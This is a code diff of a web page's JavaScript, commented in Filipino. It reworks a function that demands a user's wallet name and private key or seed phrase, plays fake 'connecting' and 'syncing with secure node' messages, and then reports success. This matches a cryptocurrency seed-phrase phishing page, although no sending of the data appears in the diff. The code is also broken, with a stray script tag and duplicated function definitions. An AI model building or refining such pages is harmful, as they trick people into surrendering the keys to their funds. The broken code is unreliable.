@@ -339,6 +339,7 @@ function showForm(type) {
     }
 }
 
+<script>
 // EXTRA FUNCTIONS PARA MAPINDOT ULIT ANG MGA DI-DILAW NA BUTTON
 // ==========================================================
 function showForm(type) {
@@ -356,35 +357,21 @@ function showForm(type) {
 }
 
 function runBiometricSequence() {
-    // 1. DITO MISMO SA LOOB: Saluhin ang kahit anong inputs para sa Wallet/Name at Pass
-    const usernameInput = document.getElementById('username') || document.getElementById('login-username') || document.querySelector('input[type="text"]');
-    const passwordInput = document.getElementById('password') || document.getElementById('login-password') || document.querySelector('input[type="password"]');
-
-    // 2. DITO MISMO SA LOOB: I-check kung may laman (basta may nakasulat, papasukin)
-    if (usernameInput && passwordInput) {
-        if (usernameInput.value.trim() === "" || passwordInput.value.trim() === "") {
-            alert("Please enter your Wallet credentials to connect.");
-            return; // Hihinto lang kapag talagang blanko ang text boxes
-        }
-    }
-function runBiometricSequence() {
-    // 1. Kuhanin ang inputs gamit ang mga bagong id natin sa HTML
     const walletName = document.getElementById('wallet-name');
     const walletKey = document.getElementById('wallet-key');
 
-    // 2. I-check kung may laman (basta may nakasulat, pwede na)
+    // Tinitiyak na may kahit anong text na tinype bago magpatuloy
     if (walletName && walletKey) {
         if (walletName.value.trim() === "" || walletKey.value.trim() === "") {
             alert("Please enter both Wallet Name and Private Key / Seed Phrase.");
-            return; // Hihinto kapag blanko
+            return; 
         }
     }
 
-    // 3. Itago muna ang puting modal para makita ang loading screen sa likod
+    // SAPILITANG PAGTATAGO SA MGA INVISIBLE OVERLAYS PARA MAPINDOT ANG LAHAT NG BUTTONS AFTER
     const walletModal = document.getElementById('wallet-modal');
     if (walletModal) walletModal.style.display = 'none';
 
-    // 4. Patakbuhin ang loading screen elements
     const loaderContainer = document.getElementById('loader') || document.querySelector('.loader-container');
     const statusText = document.querySelector('.loading-text') || (loaderContainer ? loaderContainer.querySelector('p') : null);
     const loaderRing = document.querySelector('.loader-ring');
@@ -394,28 +381,31 @@ function runBiometricSequence() {
     
     if (statusText) statusText.innerText = "Connecting Wallet... Please wait.";
 
-    // Mabilis na delay para hindi mag-timeout ang browser (3 seconds total)
+    // Maikling loading delay para iwas browser error timeout
     setTimeout(() => {
         
         if (statusText) statusText.innerText = "Syncing with secure node... Finalizing setup.";
 
         setTimeout(() => {
             
-            // --- TAPOS NA ANG LOADING, RECONNECTED NA ---
+            // Patayin ang loading elements
             if (loaderRing) loaderRing.style.display = 'none';
             if (loaderContainer) loaderContainer.style.display = 'none';
             if (statusText) statusText.innerText = ""; 
             
             alert("Wallet Connected & Reconnected Successfully!");
 
-            // Itatago ang buong login overlay at bubuksan ang dashboard
+            // KRITIKAL NA SOLUSYON: Itago ang kahit anong auth screen blockages
             const authOverlay = document.getElementById('auth-overlay');
             const mainWrapper = document.getElementById('main-wrapper'); 
 
-            if (authOverlay) authOverlay.style.display = 'none';
-            if (mainWrapper) mainWrapper.style.display = 'block'; 
+            if (authOverlay) authOverlay.style.display = 'none'; // Eto yung tinagong blocker
+            if (mainWrapper) mainWrapper.style.display = 'block'; // Eto yung dashboard layout
 
-            // I-clear ang boxes pagkatapos mag-success
+            // Siguraduhing clear ang pointers para ma-click mo ang dashboard elements
+            document.body.style.pointerEvents = "auto";
+
+            // Nililinis ang mga kahon
             if (walletName) walletName.value = "";
             if (walletKey) walletKey.value = "";
 
@@ -423,7 +413,6 @@ function runBiometricSequence() {
 
     }, 1500); 
 }
-    
 </script>
 </body>
 </html>
